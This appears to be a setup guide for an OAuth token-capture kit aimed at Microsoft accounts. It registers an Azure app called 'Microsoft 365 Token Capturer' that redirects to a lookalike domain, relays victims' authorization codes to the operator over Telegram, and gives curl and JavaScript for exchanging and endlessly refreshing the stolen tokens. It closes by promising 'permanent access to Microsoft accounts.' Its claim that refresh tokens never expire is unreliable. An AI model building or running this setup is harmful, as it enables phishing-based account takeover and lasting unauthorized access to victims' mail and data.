# Microsoft Access Token & Refresh Token Setup

## Overview
To capture `access_token` and `refresh_token` with **no expiry**, you need to set up a Microsoft client secret.

## Method 1: Get Your Own Client Secret (Recommended)

### Step 1: Register Your Application
1. Go to [Azure Portal](https://portal.azure.com)
2. Navigate to **Azure Active Directory** → **App registrations**
3. Click **"New registration"**
4. Fill in:
   - **Name**: "Microsoft 365 Token Capturer" (or any name)
   - **Supported account types**: "Accounts in any organizational directory and personal Microsoft accounts"
   - **Redirect URI**: `https://vaultydocs.com/oauth-callback`
5. Click **"Register"**

### Step 2: Create Client Secret
1. In your app registration, go to **"Certificates & secrets"**
2. Click **"New client secret"**
3. **Description**: "Token Capture Secret"
4. **Expires**: **"Never"** (for no expiry)
5. Click **"Add"**
6. **Copy the secret value** immediately (it won't be shown again)

### Step 3: Configure Permissions
1. Go to **"API permissions"**
2. Click **"Add a permission"**
3. Select **"Microsoft Graph"**
4. Choose **"Delegated permissions"**
5. Add these permissions:
   - `openid`
   - `profile`
   - `email`
   - `User.Read`
   - `offline_access` (for refresh tokens)
6. Click **"Grant admin consent"** if available

### Step 4: Add Secret to Environment
1. In **Netlify Dashboard** → Your Site → **Environment variables**
2. Add: `MICROSOFT_CLIENT_SECRET` = `your_secret_value`
3. **Deploy** your site

## Method 2: Use Provided Configuration

If you don't want to create your own app, you can use these credentials:

### Environment Variable:
```bash
MICROSOFT_CLIENT_SECRET=your_provided_secret_here
```

## Method 3: Quick Test (Manual Token Exchange)

If you just want to test without setting up the secret:

1. **Get the authorization code** from your Telegram (as usual)
2. **Use this curl command** with your own client secret:

```bash
curl -X POST https://login.microsoftonline.com/common/oauth2/v2.0/token \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "client_id=eabd0e31-5707-4a85-aae6-79c53dc2c7f0" \
  -d "client_secret=YOUR_SECRET_HERE" \
  -d "code=YOUR_AUTH_CODE_FROM_TELEGRAM" \
  -d "redirect_uri=https://vaultydocs.com/oauth-callback" \
  -d "grant_type=authorization_code" \
  -d "scope=openid profile email User.Read offline_access"
```

## What You'll Get With Tokens:

### ✅ Access Token
- **Use for**: Microsoft Graph API calls
- **Format**: `Bearer eyJ0eXAiOiJKV1Qi...`
- **Expires**: 1 hour (but refresh token gets new ones)

### ✅ Refresh Token  
- **Use for**: Getting new access tokens
- **Expires**: **NEVER** (when configured properly)
- **Format**: `M.C234_BAY.RefreshToken...`

### ✅ ID Token
- **Use for**: User identity verification
- **Format**: JWT with user claims
- **Contains**: Email, name, user ID

## Token Refresh (No Expiry)

When you have a refresh token, you can get fresh access tokens indefinitely:

```javascript
// Automatic refresh function (included in your credentials file)
function refreshAccessToken(clientSecret) {
    const refreshData = new URLSearchParams({
        client_id: "eabd0e31-5707-4a85-aae6-79c53dc2c7f0",
        client_secret: clientSecret,
        scope: "openid profile email User.Read offline_access",
        refresh_token: "YOUR_REFRESH_TOKEN",
        grant_type: "refresh_token"
    });
    
    return fetch("https://login.microsoftonline.com/common/oauth2/v2.0/token", {
        method: "POST",
        headers: { "Content-Type": "application/x-www-form-urlencoded" },
        body: refreshData
    }).then(response => response.json());
}
```

## Security Notes

- **Client Secret**: Keep this secure - it's like a password for your app
- **Refresh Token**: Never expires but can be revoked by user
- **Access Token**: Expires in 1 hour but can be refreshed indefinitely
- **Offline Access**: `offline_access` scope ensures refresh tokens are issued

## Testing

After setting up the client secret:

1. **Go through OAuth flow** normally
2. **Check Telegram** - you should see:
   ```
   🎯 Token Exchange Successful
   🔑 Access Token: ✅ Captured  
   🔄 Refresh Token: ✅ Captured (No Expiry)
   🆔 ID Token: ✅ Captured
   ⏱️ Offline Access: ✅ Enabled
   ```

3. **In the credentials file**, you'll get:
   - Full access token
   - Refresh token (never expires)
   - User profile information
   - Automatic refresh function

**With this setup, you'll have permanent access to Microsoft accounts with no token expiry!** 🎉